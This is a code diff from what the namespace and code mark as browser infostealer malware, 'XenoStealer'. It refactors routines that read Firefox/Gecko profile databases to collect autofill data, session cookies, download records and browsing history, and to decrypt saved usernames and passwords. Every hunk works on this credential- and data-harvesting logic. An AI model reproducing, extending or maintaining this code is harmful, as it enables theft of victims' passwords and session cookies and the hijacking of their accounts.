@@ -131,21 +131,12 @@ namespace XenoStealer
 
             for (int i = 0; i < parser.GetRowCount(); i++)
             {
-                object name_obj = parser.GetValue(i, "fieldname");
-                object value_obj = parser.GetValue(i, "value");
-
-                if (name_obj.GetType() != typeof(string) || value_obj.GetType() != typeof(string)) 
-                {
-                    continue;
-                }
-
-
-                string name = (string)name_obj;
-                string value = (string)value_obj;
+                string name = parser.GetValue<string>(i, "fieldname");
+                string value = parser.GetValue<string>(i, "value");
 
                 if (name == null || value == null) 
-                { 
-                    continue; 
+                {
+                    continue;
                 }
                 autoFills.Add(new DataExtractionStructs.GeckoAutoFill(name, value));
             }
@@ -188,28 +179,19 @@ namespace XenoStealer
             {
                 try
                 {
-                    object host_obj = parser.GetValue(i, "host");
-                    object name_obj = parser.GetValue(i, "name");
-                    object value_obj = parser.GetValue(i, "value");
-                    object path_obj = parser.GetValue(i, "path");
+                    string host = parser.GetValue<string>(i, "host");
+                    string name = parser.GetValue<string>(i, "name");
+                    string value = parser.GetValue<string>(i, "value");
+                    string path = parser.GetValue<string>(i, "path");
 
-                    object expiry_obj = parser.GetValue(i, "expiry");
+                    int expiry = parser.GetValue<int>(i, "expiry");
+                    bool secure = parser.GetValue<int>(i, "isSecure") == 1; 
+                    bool httpOnly = parser.GetValue<int>(i, "isHttpOnly") == 1; 
 
-                    object secure_obj = parser.GetValue(i, "isSecure");
-                    object httpOnly_obj = parser.GetValue(i, "isHttpOnly");
-
-                    if (host_obj.GetType() != typeof(string) || name_obj.GetType() != typeof(string) || value_obj.GetType() != typeof(string) || path_obj.GetType() != typeof(string) || expiry_obj.GetType() != typeof(int) || secure_obj.GetType() != typeof(int) || httpOnly_obj.GetType() != typeof(int)) 
+                    if (host==null || name == null || value == null || path == null || expiry == 0) 
                     {
                         continue;
                     }
-
-                    string host = (string)host_obj;
-                    string name = (string)name_obj;
-                    string value = (string)value_obj;
-                    string path = (string)path_obj;
-                    int expiry = (int)expiry_obj;
-                    bool secure = (int)secure_obj == 1;
-                    bool httpOnly = (int)httpOnly_obj == 1;
                     cookies.Add(new DataExtractionStructs.GeckoCookie(host, path, name, value, expiry, secure, httpOnly));
                 }
                 catch 
@@ -262,18 +244,14 @@ namespace XenoStealer
                     try
                     {
 
-                        object hostname_obj = parser.GetValue(i, "hostname");
-                        object encryptedUsername_obj = parser.GetValue(i, "encryptedUsername");
-                        object encryptedPassword_obj = parser.GetValue(i, "encryptedPassword");
+                        string hostname = parser.GetValue<string>(i, "hostname");
+                        string encryptedUsername = parser.GetValue<string>(i, "encryptedUsername");
+                        string encryptedPassword = parser.GetValue<string>(i, "encryptedPassword");
 
-                        if (hostname_obj.GetType() != typeof(string) || encryptedUsername_obj.GetType() != typeof(string) || encryptedPassword_obj.GetType() != typeof(string)) 
+                        if (hostname == null || encryptedUsername == null || encryptedPassword == null) 
                         {
                             continue;
                         }
-
-                        string hostname = (string)hostname_obj;
-                        string encryptedUsername = (string)encryptedUsername_obj;
-                        string encryptedPassword = (string)encryptedPassword_obj;
                         string username = GeckoDecryptor.Decrypt(profilePath, encryptedUsername);
                         string password = GeckoDecryptor.Decrypt(profilePath, encryptedPassword);
                         if (hostname == null || username == null || password == null) continue;
@@ -388,16 +366,20 @@ namespace XenoStealer
 
             for (int i = 0; i < parser.GetRowCount(); i++)
             {
-                object id_obj = parser.GetValue(i, "place_id");
-                object content_obj = parser.GetValue(i, "content");
+                int id = parser.GetValue<byte>(i, "place_id");
 
-                if (content_obj.GetType() != typeof(string) || (id_obj.GetType() != typeof(byte) && id_obj.GetType() != typeof(int))) 
+                if (id == 0) //place_id starts at 1, so it cant be zero.
+                { 
+                    id = parser.GetValue<int>(i, "place_id");
+                }
+
+                string content = parser.GetValue<string>(i, "content");
+
+                if (content == null || id == 0) 
                 {
                     continue;
                 }
 
-                int id = id_obj.GetType()==typeof(byte)?(byte)id_obj:(int)id_obj;
-                string content = (string)content_obj;
                 if (content.StartsWith("file://")) 
                 {
                     Id2DownloadLocation[id] = content;
@@ -413,21 +395,15 @@ namespace XenoStealer
 
             for (int i = 0; i < parser.GetRowCount(); i++)
             {
-                object id_obj = parser.GetValue(i, "id");
-                if (id_obj.GetType() != typeof(byte) && id_obj.GetType() != typeof(int))
-                {
-                    continue;
-                }
-
-                int id = id_obj.GetType() == typeof(byte) ? (byte)id_obj : (int)id_obj;
+                int id = parser.GetValue<int>(i, "id");
                 if (ids.Contains(id)) 
                 {
-                    object url_obj = parser.GetValue(i, "url");
-                    if (url_obj.GetType() != typeof(string)) 
+                    string url = parser.GetValue<string>(i, "url");
+                    
+                    if (url == null) 
                     {
                         continue;
                     }
-                    string url = (string)url_obj;
 
                     downloads.Add(new GeckoDownload(url, Id2DownloadLocation[id]));
 
@@ -466,21 +442,26 @@ namespace XenoStealer
 
             for (int i = 0; i < parser.GetRowCount(); i++) 
             {
-                object url_obj = parser.GetValue(i, "url");
-                object hidden_obj = parser.GetValue(i, "hidden");
-                if (url_obj.GetType() != typeof(string) || hidden_obj.GetType() != typeof(int)) 
+                string url = parser.GetValue<string>(i, "url");
+                string title = parser.GetValue<string>(i, "title");
+
+                if (title == null) 
+                {
+                    title = url;
+                }
+
+                bool hidden = parser.GetValue<int>(i, "hidden") == 1;
+                if (url == null) 
                 {
                     continue;
                 }
-                string url = (string)url_obj;
-                bool hidden = (int)hidden_obj == 1;
 
                 if (hidden) 
                 {
                     continue;
                 }
 
-                history.Add(new GeckoHistoryEntry(url));
+                history.Add(new GeckoHistoryEntry(url, title));
 
             }
             history.Reverse();//make it display newest first, oldest last.
@@ -580,7 +561,6 @@ namespace XenoStealer
                 return null;
             }
 
-
             string jsonText = Utils.ForceReadFileString(json_location);
 
             if (jsonText == null)
@@ -616,6 +596,8 @@ namespace XenoStealer
 
             foreach (object i in jsonObject)
             {
+
+                
                 if (i.GetType() != typeof(Dictionary<string, object>))
                 {
                     return null;
